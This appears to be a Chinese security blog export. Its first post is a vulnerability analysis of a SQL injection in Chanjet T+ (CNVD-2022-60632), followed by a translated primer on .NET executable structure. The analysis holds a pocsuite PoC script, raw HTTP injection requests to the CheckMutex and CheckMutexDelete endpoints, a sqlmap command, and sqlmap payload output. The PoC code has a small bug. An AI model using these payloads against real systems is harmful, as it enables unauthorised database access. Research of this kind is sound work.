如果是提交漏洞的同时提交 PoC,则写成 0 version = &#x27;1&#x27; # 默认为1 author = [&#x27;&#x27;] # PoC作者的大名 vulDate = &#x27;2022-09-23&#x27; # 漏洞公开的时间,不知道就写今天 createDate = &#x27;2022-09-23&#x27; # 编写 PoC 的日期 updateDate = &#x27;2022-09-23&#x27; # PoC 更新的时间,默认和编写时间一样 references = [&#x27;&#x27;] # 漏洞地址来源,0day不用写 name = &#x27;畅捷通T+ SQL上传&#x27; # PoC 名称 appPowerLink = &#x27;&#x27; # 漏洞厂商主页地址 appName = &#x27;畅捷通T+&#x27; # 漏洞应用名称 appVersion = &#x27;&#x27;&#x27;13.0 &lt;= 畅捷通T+单机版&lt;=16.0且使用IIS10.0以下版本&#x27;&#x27;&#x27; # 漏洞影响版本 vulType = VUL_TYPE.UPLOAD_FILES # 漏洞类型,类型参考见 漏洞类型规范表 desc = &#x27;&#x27;&#x27; CNVD-2022-60632 畅捷通T+ SQL漏洞 &#x27;&#x27;&#x27; # 漏洞简要描述 samples = [&#x27;&#x27;] # 测试样列,就是用 PoC 测试成功的网站 install_requires = [&#x27;&#x27;] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写 pocDesc = &#x27;&#x27;&#x27; 检测:pocsuite -r .\\poc++.py -u url(-f url.txt) --verify &#x27;&#x27;&#x27; category = POC_CATEGORY.EXPLOITS.REMOTE def _verify(self): if self.url.endswith(&quot;/&quot;): path = &quot;tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex&quot; else: path = &quot;/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex&quot; result = &#123;&#125; headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;, &#125; if not self.url.startswith(&#x27;http://&#x27;) and not url.startswith(&#x27;https://&#x27;): url = &#x27;http://&#x27; + self.url url = self.url + path headers[&#x27;Content-Type&#x27;] = &quot;application/x-www-form-urlencoded&quot; data = &#x27;&#x27;&#x27;&#123;&quot;accNum&quot;: &quot;3&#x27;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125; # data = &#x27;&#x27;&#x27;&#123;&quot;accNum&quot;: &quot;3&#x27; AND (select )-- NCab&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125; &#x27;&#x27;&#x27; print(f&quot;数据: &#123;data&#125;&quot;) print(f&quot;扫描目标: &#123;url&#125;&quot;) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) repData =requests.post(url, headers=headers, data=data, timeout=1000, verify=False) print(f&quot;响应: &#123;repData.text&#125;&quot;) if &quot;Microsoft SQL Server&quot; in repData.text and &quot;error&quot; not in repData.text: #if repData.status_code == 200: result[&#x27;VerifyInfo&#x27;] = &#123;&#125; result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = url result[&#x27;VerifyInfo&#x27;][&#x27;message&#x27;] = repData.text result[&#x27;VerifyInfo&#x27;][&#x27;shell&#x27;] = self.url + &#x27;/tplus/UFAQD/InitServerInfo.aspx?preload=1&#x27; except Exception as e: print(e) return return self.parse_output(result) def _attack(self): return self._verify() def parse_attack(self, result): output = Output(self) if result: output.success(result) else: output.fail(&#x27;target is not vulnerable&#x27;) return output def _shell(self): return def parse_output(self, result): output = Output(self) if result: output.success(result) else: output.fail(&#x27;target is not vulnerable&#x27;) return outputregister_poc(ChanJetPOC) 使用 pocsuit 执行上述 poc 结果如下所示： .zjdawvcxaoma{zoom:80%;} 可以看到执行的 POC 为 &#123;&quot;accNum&quot;: &quot;3&#39;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125; ，查询语句为 select @@version ，并且查询返回了 SQL Server 的版本为 Microsoft SQL Server 2022 (RTM)……。 使用 SqlMap 检测根据上述 POC 编写 sqlmap 的检测文件。 1234567891011# sql.txtPOST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36Accept: text/css,*/*;q=0.1Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 53&#123;&quot;accNum&quot;: &quot;3&#x27;&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125; 使用 sqlmap 执行上述检测文件，如果为 sqlmap 不熟悉，可以参考这篇文章：【SQL注入】Sqlmap使用指南(手把手保姆版)持续更新_web union sql 注入 测试工具-CSDN博客 1python sqlmap.py -r sql.txt --random-agent -v 3 --dbms mssql --hex -p &quot;accNum&quot; --batch 这里对上述执行命令稍加说明： -r: 指定从文件中加载 http 请求 --random-agent：使用随机选择的HTTP User-Agent头部值 -v: 详细级别: 0-6（默认为1） --dbms: 指定是数据库名 --hex: 在数据检索过程中使用十六进制转换 -p: 可测试的参数 --batch: 不要询问用户输入,使用默认行为 运行完上述命令之后就会生成 sql 漏洞相关注入点，以畅捷通 SQL 漏洞为例，输出如下所示： 12345678910111213141516sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:---Parameter: JSON accNum ((custom) POST) Type: error-based Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN) Payload: &#123;&quot;accNum&quot;: &quot;3&#x27; AND 3159 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(107)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (3159=3159) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(113)+CHAR(113)))-- zxmb&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125; Vector: AND [RANDNUM] IN (SELECT (&#x27;[DELIMITER_START]&#x27;+([QUERY])+&#x27;[DELIMITER_STOP]&#x27;)) Type: UNION query Title: Generic UNION query (NULL) - 22 columns Payload: &#123;&quot;accNum&quot;: &quot;3&#x27; UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(120)+CHAR(107)+CHAR(106)+CHAR(113)+CHAR(72)+CHAR(103)+CHAR(87)+CHAR(72)+CHAR(115)+CHAR(109)+CHAR(84)+CHAR(82)+CHAR(117)+CHAR(65)+CHAR(80)+CHAR(105)+CHAR(112)+CHAR(84)+CHAR(81)+CHAR(66)+CHAR(116)+CHAR(120)+CHAR(73)+CHAR(103)+CHAR(106)+CHAR(79)+CHAR(71)+CHAR(102)+CHAR(80)+CHAR(110)+CHAR(104)+CHAR(75)+CHAR(113)+CHAR(116)+CHAR(82)+CHAR(114)+CHAR(112)+CHAR(117)+CHAR(82)+CHAR(104)+CHAR(89)+CHAR(105)+CHAR(114)+CHAR(73)+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(113)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- nhDS&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125; Vector: UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]---web server operating system: Windowsweb application technology: Nginx 1.16.1, ASP.NET, ASP.NET 4.0.30319back-end DBMS: Microsoft SQL Server 2022 以下是【文心一言】对上述结果的解读： SQLMap 的输出显示了它已识别到的 SQL 注入点，并提供了详细的注入类型和对应的 payload。这是它自动检测到的潜在安全漏洞。 以下是关于输出的一些解释： 注入点信息 参数：JSON accNum 是一个 JSON 格式的 POST 请求参数，它是 SQL 注入的入口点。 类型 error-based：基于错误的注入类型，它利用数据库错误消息来推断 SQL 查询的结构。 UNION query：UNION 查询注入类型，它利用 SQL 的 UNION 语句来合并多个查询结果。 Payload Payload 是 SQLMap 构造的恶意输入，用于触发 SQL 注入并提取信息。例如，3&#39; AND 3159 IN (SELECT ... 就是一个用于触发基于错误的注入的 payload。 Vector Vector 是 SQLMap 使用的注入模板，用于构造具体的 payload。 Web 服务器操作系统和技术 SQLMap 还识别了目标服务器的操作系统（Windows）以及使用的 web 技术（Nginx 1.16.1, ASP.NET, ASP.NET 4.0.30319）。 后端数据库管理系统 识别出的后端数据库是 Microsoft SQL Server 2022。 根据这些信息，您可以进一步分析目标系统的安全性，并考虑采取适当的措施来修复这些 SQL 注入漏洞。这可能包括更新或修补应用程序代码、使用参数化查询或预编译的语句来防止 SQL 注入，以及限制对数据库的访问权限等。 请注意，在实际环境中，一旦发现了 SQL 注入漏洞，您应该立即通知相关的系统管理员或安全团队，并避免未经授权地访问或利用这些漏洞。 堆栈分析SQL 执行堆栈SQL 执行函数： ExecuteReader 执行的 SQL 注入的参数： “select id,UseLogID,Acaa_Num,UserID,UserName,PersonName,Url,HostAddress,HostName,FunctionTag,FunctionName,BeginTime,State,Version,Description,TaskID,ModelClassType,ModelType,ClientType,ServerAddress from EAP_Mutex with(nolock) where userid &lt;&gt; N’’ and Acaa_Num &#x3D; N’6’and (select @@version)&gt;0– N’ and Version &#x3D; ‘YWTPro N’ order by begintime” 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051System.Data.dll!System.Data.SqlClient.SqlCommand.ExecuteReader(System.Data.CommandBehavior behavior, string method) (IL=0x0000, Native=0x00007FF928E40F90+0x37)// 原型// Token: 0x060019A2 RID: 6562 RVA: 0x000B587C File Offset: 0x000B4C7Cinternal SqlDataReader ExecuteReader(CommandBehavior behavior, string method)&#123; SqlConnection.ExecutePermission.Demand(); this._pendingCancel = false; SqlStatistics statistics = null; TdsParser target = null; RuntimeHelpers.PrepareConstrainedRegions(); bool success = false; int? sqlExceptionNumber = null; SqlDataReader result; try &#123; this.WriteBeginExecuteEvent(); target = SqlInternalConnection.GetBestEffortCleanupTarget(this._activeConnection); statistics = SqlStatistics.StartTimer(this.Statistics); SqlDataReader sqlDataReader = this.RunExecuteReader(behavior, RunBehavior.ReturnImmediately, true, method); success = true; result = sqlDataReader; &#125; catch (SqlException ex) &#123; sqlExceptionNumber = new int?(ex.Number); throw; &#125; catch (OutOfMemoryException e) &#123; this._activeConnection.Abort(e); throw; &#125; catch (StackOverflowException e2) &#123; this._activeConnection.Abort(e2); throw; &#125; catch (ThreadAbortException e3) &#123; this._activeConnection.Abort(e3); SqlInternalConnection.BestEffortCleanup(target); throw; &#125; finally &#123; SqlStatistics.StopTimer(statistics); this.WriteEndExecuteEvent(success, sqlExceptionNumber, true); &#125; return result;&#125; 漏洞堆栈12345678910111213141516171819Ufida.T.SM.UIP.dll!Ufida.T.SM.UIP.MultiCompanyController.CheckMutex(string url, string accNum, string functionTag) (IL=prolog, Native=0x00007FF8F4474D30+0x0) [本机到托管的转换] mscorlib.dll!System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(object obj, object[] parameters, object[] arguments) (IL≈0x0016, Native=0x00007FF94CA3F9A0+0x84) mscorlib.dll!System.Reflection.RuntimeMethodInfo.Invoke(object obj, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, object[] parameters, System.Globalization.CultureInfo culture) (IL=epilog, Native=0x00007FF94CA57300+0x92) mscorlib.dll!System.Reflection.MethodBase.Invoke(object obj, object[] parameters) (IL=epilog, Native=0x00007FF94CAD6AE0+0x22) AjaxPro.2.dll!AjaxPro.AjaxProcHelper.Run() (IL≈0x066C, Native=0x00007FF8F44599A0+0xAD3) AjaxPro.2.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context) (IL=0x0010, Native=0x00007FF8F4459900+0x3A) System.Web.dll!System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute() (IL≈0x018D, Native=0x00007FF93CA37CD0+0x21E) System.Web.dll!System.Web.HttpApplication.ExecuteStepImpl(System.Web.HttpApplication.IExecutionStep step) (IL=epilog, Native=0x00007FF93C9FADA0+0x4B) System.Web.dll!System.Web.HttpApplication.ExecuteStep(System.Web.HttpApplication.IExecutionStep step, ref bool completedSynchronously) (IL≈0x0015, Native=0x00007FF93C9FAE00+0x5D) System.Web.dll!System.Web.HttpApplication.PipelineStepManager.ResumeSteps(System.Exception error) (IL≈0x027A, Native=0x00007FF93CA0E650+0x5CF) System.Web.dll!System.Web.HttpApplication.BeginProcessRequestNotification(System.Web.HttpContext context, System.AsyncCallback cb) (IL=0x0031, Native=0x00007FF93C9F9AB0+0x7D) System.Web.dll!System.Web.HttpRuntime.ProcessRequestNotificationPrivate(System.Web.Hosting.IIS7WorkerRequest wr, System.Web.HttpContext context) (IL≈0x00B0, Native=0x00007FF93CA0CCA0+0xE0) System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotificationHelper(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, int flags) (IL≈0x0131, Native=0x00007FF93C9FBE90+0x4DC) System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotification(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, int flags) (IL≈0x0000, Native=0x00007FF93C9FBE50+0x14) [托管到本机的转换] System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotificationHelper(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, int flags) (IL≈0x01E7, Native=0x00007FF93C9FBE90+0x607) System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotification(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, int flags) (IL≈0x0000, Native=0x00007FF93C9FBE50+0x14) [程序域转换] 主要看方法 Ufida.T.SM.UIP.dll!Ufida.T.SM.UIP.MultiCompanyController.CheckMutex(string url, string accNum, string functionTag) 入参如下所示： 其中 CheckMutex 的属性为 AjaxMethod ，然后我们根据入参提供对应的参数即可。 可以看到需要满足 functionTag 为 SYS0104，才能执行 CheckUserFunction 函数，而 CheckUserFunction 执行的就是 accNum 的值。 然后在执行畅捷通接口 Ufida.T.EAP.Mutex.Interface.IMutex.CheckUserFunction 时报了异常，但是仍然执行了 SQL 。 在异常信息中可以看到 1$exception.SqlString = &quot;select id,UseLogID,Acaa_Num,UserID,UserName,PersonName,Url,HostAddress,HostName,FunctionTag,FunctionName,BeginTime,State,Version,Description,TaskID,ModelClassType,ModelType,ClientType,ServerAddress from EAP_Mutex with(nolock) where userid &lt;&gt; N&#x27;&#x27; and Acaa_Num = N&#x27;3&#x27;and (select @@version)&gt;0-- N&#x27; and Version = &#x27;YWTPro N&#x27; order by begintime&quot; 可以看下注入前与注入后的SQL语句对比： 12345678910111213141516171819202122232425262728293031323334353637select id, UseLogID, Acaa_Num, UserID, UserName, PersonName, Url, HostAddress, HostName, FunctionTag, FunctionName, BeginTime, State, Version, Description, TaskID, ModelClassType, ModelType, ClientType, ServerAddressfrom EAP_Mutexwith(nolock)# 上边代码一致# 注入前where userid &lt;&gt; N&#x27;&#x27; and Acaa_Num = N&#x27;3N&#x27; and Version = &#x27;YWTPro N&#x27;# 注入后where userid &lt;&gt; N&#x27;&#x27; and Acaa_Num = N&#x27;3&#x27; and (select @@version)&gt;0-- N&#x27; and Version = &#x27;YWTPro N&#x27; 然后在执行时因为报错，返回了异常信息，也就返回了我们要执行的查询结果，异常捕捉的堆栈如下所示： 12345在 Ufida.T.EAP.Aop.Dynamic.LocalCallDynamicProxyImpl.NormalInvoke(MethodBase method, Object[] args, Boolean needFreeCuid)\\r\\n 在 Ufida.T.EAP.Aop.Dynamic.LocalCallDynamicProxyImpl.Invoke(IMessage message)\\r\\n 在 System.Runtime.Remoting.Proxies.RealProxy.PrivateInvoke(MessageData&amp; msgData, Int32 type)\\r\\n 在 Ufida.T.EAP.Mutex.Interface.IMutex.CheckUserFunction(String accountNum)\\r\\n 在 Ufida.T.SM.UIP.MultiCompanyController.CheckMutex(String url, String accNum, String functionTag) 使用 dnSpy 反编译之后可以看到，CheckMutexDelete 方法也可以用于该漏洞，需要在 请求体添加 dsName 参数： 12345678910POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutexDelete HTTP/1.1Host: 192.168.19.137:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36Accept: text/css,*/*;q=0.1Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 53&#123;&quot;accNum&quot;: &quot;3&#x27;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;, &quot;dsName&quot;:&quot;&quot;&#125;","tags":[],"categories":[{"name":"A_内功","slug":"A-内功","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"A_POC探索","slug":"A-内功/A-POC探索","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"},{"name":"畅捷通","slug":"A-内功/A-POC探索/畅捷通","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"}]},{"title":"【POC】pocsuite 用法","date":"2024-04-01T08:26:20.115Z","path":"B_Code/Python/【POC】pocsuite 用法/","text":"概述：pocsuite 工具的用法整理 参考链接： 工具| PocSuite 使用介绍 - FreeBuf网络安全行业门户","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Python","slug":"B-Code/Python","permalink":"http://example.com/categories/B-Code/Python/"}]},{"title":"【.Net】可执行文件结构分析（翻译）","date":"2024-03-19T03:26:50.783Z","path":"B_Code/CSharp/【.Net】可执行文件结构分析/","text":"概述：.Net 可执行文件结构分析（翻译） [toc] .NET 框架.NET 软件开发框架和生态系统是由微软在2002年首次发布。旨在提供一个可控的编程环境并且可以在基于Windows操作系统上进行开发、安装和执行。随着 .NET 的发展，.NET5 之后开始支持跨平台开发，并且支持多语言（C#、VB.NET和F#）。 .NET 框架包含了一个名为 Framenwork Class Library（FCL） 的大型类库，为开发人员提供了从数据访问到加密以及 XML 解析等一系列线程可用、经过测试和优化的功能。由于广泛的支持和托管运行环境使得 .Net 需要更多人工干预的语言和框架。将以上特性结合起来，可以创建一个在桌面、前端、移动设备创建一些列应用程序的高效环境。 .NET威胁环境相比于 C&#x2F;C++，由于 .NET 用户友好的开发过程、丰富的功能集、以及平滑的 Windows 集成，恶意软件开发人员可能更喜欢 .NET 框架。但是，像 dnSpy 这样的工具使得逆向恶意软件变的很简单，促使了创造这些恶意软件的人使用模糊方法，使得分析更加困难。另外，.NET 的能力是的恶意软件改变其行为或者隐藏使其更难以检测和逆向。虽然 C&#x2F;C++ 允许对系统资源进行更精细的控制，以至于其可能会导致更谨慎和更高效的恶意软件，但是这需要对系统内部工作原理有更深入地了解。这就使得 .NET 更加有吸引力了，因为追求开发速度和易用性的 .NET 是一个更有吸引力选择。 .NET 威胁环境持续演变，攻击者经常利用适应性强且被广泛采用的 .NET 框架来精心编制和部署各种复杂的威胁。这个框架支撑了许多网络攻击，比如臭名昭著的 Locky 和 Killnet。凭据窃取程序和英航特洛伊木马程序（如CryptoClippy）同样也是基于 .NET 的威胁。此外，用 .NET 编写的破坏性 Wipers 正在不断增加。DoubleZero 以及最近发现的 Hatef Wiper 就是这种趋势的例证。 此外，.Net 在创建远程访问特洛伊木马（RATs）方面也发挥了重要的作用。例如 QuasarRAT 和 NanoCore，它们因其丰富的功能集以及易于修改和混淆而在地下圈子广受赞誉。此外，.NET 是创建恶意软件加载器的常用工具，这些加载器可以谨慎地安装和执行其他类型的恶意软件。 .NET 编译和运行编译 - 托管代码托管语言（C#、F#或VB.NET） 的执行由运行库控制。当合适的语言编译器编译源代码时，输出中间语言（Intermediate Language，IL），也被成为 MSIL(Microsoft Intermediate Language)，托管代码（Managed Code）或者公共中间语言（Common Intermediate Language，CIL）。 举例说明，当在 .NET 框架下编译 C# 代码时，C# 编译器（csc.exe）的输出是一个 .NET 程序集，该程序集可以是独立程序的可执行文件，也可以是可重用库的动态链接库（DLL）。 这与编译非托管语言（比如 C&#x2F;C++）不同，在非托管语言中，源代码直接转换为机器码。然后托管代码打包到一个程序集中，并附带一个包含所需元数据的清单。 托管代码的优美之处在于可移植性和灵活性；同样的程序集可以在 .NET 支持的任何平台上运行，而无需重新编译。此外，托管代码允许跨语言继承代码访问安全性。它提供了后期绑定支持的优势，从而可以在运行时进行解析并调用函数。托管代码和程序集结构提供的这种级别的抽象是 .NET 框架的多功能行和强大功能的基石，使其开发人员能更安全、更易管理、更适时地去开发应用程序。 下图演示了 .NET 中的编译和执行过程，以 C# 作为演示，但适应于所有的 .NET 语言。 运行时库 - 通用语言运行库(The Common Language Runtime,CLR)通用运行时库是管理 .NET 程序执行的微软 .NET 框架中的一个重要组件。它本质上是提供运行 .NET 应用程序所需的各种服务的执行引擎，而不管这些应用程序是用什么变成语言编写的。 当一个 .NET 二进制文件被执行时， CLR 开始设置执行环境，但不会立马去把所有的托管语言翻译为原始的机器码。实时编译（Just-In-Time）会在被调用的时候将托管代码转换为机器码。这确保了在特定硬件上的高效执行。此外，.NET Core 和 .NET 5+ 中的 NGEN 和 AOT 编译技术可以在执行托管代码前将其预编译为本机代码，从而进一步提高了性能。 CLR 的功能超出了应用程序的执行范围；它提供了诸如内存管理、异常处理、垃圾回收、类型安全检查和安全性等关键服务。由 CLR 协调的内存管理抽象了开发人员手动分配和释放内存的需要，显著减少了内存泄漏和相关错误。提供自动的垃圾回收来管理对象生命周期，通过释放应用程序不再使用的对象来回收内存。 此外，CLR 强制执行严格的类型安全并确保应用程序不会尝试执行不安全或未经验证的操作。它在 .NET 的安全体系结构中也发挥着重要作用，提供代码访问安全性（Code Access Security,CAS），其根据分配给应用程序的信任级别控制程序可以访问那些资源。总体来说，CLR 创建了一个高级别的环境，可以有效减少传统变成语言所需的香醋多低级编程任务，实现了更快的开发周期、更高的生产力和更安全可靠的应用程序。这使得 CLR 成为 .NET 生态系统不可或缺的组件。 非托管函数.NET 框架中的非托管函数是指在 CLR 的托管环境之外运行的代码。这些函数通常用 C 或 C++ 等语言编写，并直接编译成机器特定的代码，绕过 CLR 的管理。这也意味着上述的一些特征如内存管理、垃圾回收等功能是托管环境固有的功能不适用于这些非托管函数。它们主要用于互相操作的目的，允许 .NET 应用程序利用不是与 .NET 程序兼容语言编写的遗留代码或者外部库。当需要使用现有的非 .NET 库或者调用系统级别的 API 时，只能通过非托管代码访问。 然而，这带来了额外的复杂性和责任，因为开发人员必须手动处理内存泄漏和错误处理，增加了内存泄漏和安全漏洞等问题的可能性。在恶意软件分析的上下文中，了解非托管函数至关重要，因为它们可用于执行绕过托管环境的某校保护措施的代码，从而在分析和检测中带来不一般的挑战。 非托管函数示例要创建使用非托管代码创建一个简单的 .NET 应用程序，可以使用 C# 中的平台调用服务（Platform Invocation Services, PInvoke）。PInvoke 允许托管代码从动态链接库（DLL）中调用非托管函数。 如下所示为：从 user32.dll 中调用 MessageBox 函数，user32.dll 是一个标准的Windows库。 12345678910111213141516171819202122232425using System;using System.Runtime.InteropServices;class Program&#123; // Importing the MessageBox function from user32.dll [DllImport(&quot;user32.dll&quot;, CharSet = CharSet.Unicode)] public static extern int MessageBox(IntPtr hWnd, String text, String caption, uint type); static void Main(string[] args) &#123; // Calling the MessageBox function - this is an unmanaged function call MessageBox(new IntPtr(0), &quot;Hello, World!&quot;, &quot;Message Box&quot;, 0); &#125;&#125; 简单说明一下上述代码： 首先从 user32.dll 中使用 DllImport 属性导入 MessageBox 函数。 这一步非常关键，主要是告诉 CLR 这个函数是一个外部函数，而非 .NET 运行时库函数。 MessageBox 的声明与 user32.dll 中的非托管函数一致。 在 Main 函数中， 调用 MessageBox 函数， 参数包括一个窗口句柄（示例传递的 IntPtr(0)）、一个文本（Hello, World!）、一个窗口标题（Message Box）、以及一个消息框类型参数 （0，0 指最简单的只有一个确认按钮的窗口）。 当程序被运行，将在屏幕上显示一个窗口。 .NET 程序集.NET 程序集是 .NET 应用程序的基本构成，用作一个或多个代码模块或资源文件的集合。生成的程序集的内容包括以下三个部分： Intermediate Language, IL：IL 是一个与 CPU 无关的指令集，它使相同的程序集能够在 .NET 框架支持的不同平台上执行。 Metadata：它描述了由 CLR 管理的结构元素，如程序集、类型（类、接口、枚举、结构体），方法等等。这包括调试、垃圾回收、安全属性所需的信息以及运行库管理代码所需的详细信息。 Manifest: 是描述程序集本身的元数据的特定部分。它包括程序集的名称、版本、区域性，还可能包括唯一标识程序集的强名称。元数据描述程序集内的内从，而清单文件提供程序集整体的高级别概述，以确保程序集与其所依赖的其他正确版本的程序集交互。 .NET 可执行文件格式分析在这一部分，将对 .NET 内层进程分析。作者使用一个示例（The Notorious SubBurst）来演示所涉及到的概念，以便于能理解。 示例：Malicious SUNBURST b91ce2fa41029f6955bff20079468448 - Intezer 文件hash: 32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77 使用到的工具有 dnSpy、 ILSpy、 和 PEStudio 。(这里建议大家实际操作去打开一个 C# 编译的 dll 查看一下) （由于资源下载的缘故，我没法拿到样本进行展示，看看原作者的分析内容吧） 在 .NET 程序集上下文的运行时标头指定了由 CLR 使用的 PE 文件格式中的基本元素，包含了 CLR 正确执行该 .NET 程序集所需的元数据和关键详细信息。该运行时标头是 PE 文件标头中的第 15 个数据目录条目，也被成为 CLR 运行时标头（CLR 头）。 数据目录是 PE 文件中的索引或目录，列出了重要部分，并提供了各个部分的位置和大小，这个结构提供对 PE 文件不同部分的高效访问，例如导入和导出表、资源、CLR 运行时头等。 如下所示条目描述了运行时标头的相对虚拟地址及其大小，从而将 CLR 引导到此标头来管理 .NET 程序集在加载时如何执行。 截图的第15个条目表是 .NET 的相关信息。 接下来的部分，作者主要介绍了 PE 结构、元数据头及之前的关系。 元数据头管理了文件内容。它提供了一个分类目录来列出每一块数据的大小、以及偏移量。当 CLR 或者如 dnSpy 或者 ILDasm 这些工具需要访问一段元数据的时候，它会查询元数据头以找到合适的文件流。然后，它导航到该流中的正确位置以读取数据。 接下来，就是分析说明 .NET 元数据头中的各个关键字。 Signature: 签名、所有的 .NET 元数据头签名都是 BSJB (0x42534a42) GUID：长度为 128bits 的唯一标识 IL-Only：这个标志指明程序集只包含中间语言（IL）代码，而不包含特定于CPU的本机代码。PE 可以同时包含托管代码和非托管代码。 32-bit-required: 设置这个标志时，表示程序需要32位运行库，即使运行在64为操作系统上。它通常用于依赖于32为本机依赖项或32位运行时的特定行为的程序集。 Strong Name Signed: 强签名。指示程序集是否已使用强签名。强命名涉及使用公钥&#x2F;私钥对程序集进行签名，提供唯一标识并确保程序集未被篡改。 存储流（Streams）是指包含特定类型的元数据的结构化数据段，.NET 程序集元数据的关键流包括： #~（Tilde）Stream：主元数据块包含元数据表。这些表存储有关程序集中定义的类型、方法、字段、参数和其他元素的信息。波浪线数据块是根据 CLI 规范定义的元数据表模式构造的。 #Strings Stream: 这个数据块存储元数据使用的字符串，比如类型名称、方法名称和字段名称^这块内容在后文会用到^。元数据表（#~数据块中）的引用指向了当前数据流中实际字符串的偏移量。 #US(User Strings) Stream: 这个数据块保存程序集中使用的文本字符串值，如代码中的字符串变量或字符串常量的默认值。元数据引用这些字符串，特别是在加载字符串文字的指令中。 #GUID Stream: 包含程序集使用的GUID。固定大小为 0x10，此数据块中的每个条目都是一个GUID，用于标识元数据的某些方面，如模块版本的ID(MVID)。 #Blob Stream: “Binary Large Object” 数据块。存储用于各种情况的二进制数据，比如字段的默认值、方法签名、属性签名和封送处理信息。元数据表中的项引用此数据块以获取详细的二进制信息。 #Pdb Stream: 可选数据块，包括元数据和 IL 代码与源文件以及和文件相关联的调试信息。 在不同的 .NET 程序集查看到的内容可能不太一样，ILSpy 会展示 元数据 的各个组成部分，dnSpy 则会解析为一个 PE 文件。 MetadataMetadata 在 .NET 中就是一组描述程序结构及其特点的二进制数据。包含了代码中定义的类型（类、接口、枚举等），成员定义（方法、属性、字段、事件）引用类型和成员以及程序集本身的信息。 在存储次描述性信息的 PE 文件中，元数据被划分为几个表，统称为元数据表。每个表都遵循一个特定的模式，该模式概述其包括的数据结构和性质。以下是可以在元数据表中能找到的一些关键类型的信息： 定义表（Definition Table）：包含有关在当前程序集中定义的代码的信息。包括以下几个表： 类型定义表（TypeDef Table）： 源代码中定义的每个类或接口的详细信息，包括其名称、可见性、基类型以及它包含的方法或属性。主要关键字包括： 类型名：类型的名称 命名空间：该类型所属的命名空间 基础类型：Typedef、TypeRef 或 TypeSpec 表的索引，指示类型的基类。 标志位：描述类型属性（可视化，抽象&#x2F;封装状态，等） 方法定义表（MethodDef Table）：每个方法的详细信息，包括其名称、签名（参数和返回类型）以及与其相关的 IL 代码。主要关键字为以下几个： 名称：方法名 签名：指向方法名称的 blob 索引，其中包括方法的调用约定、返回类型和参数。 相对虚拟地址（RVA）：相对虚拟地址，指向方法实现在PE文件中位置。 关键字定义表（FieldDef Table）: 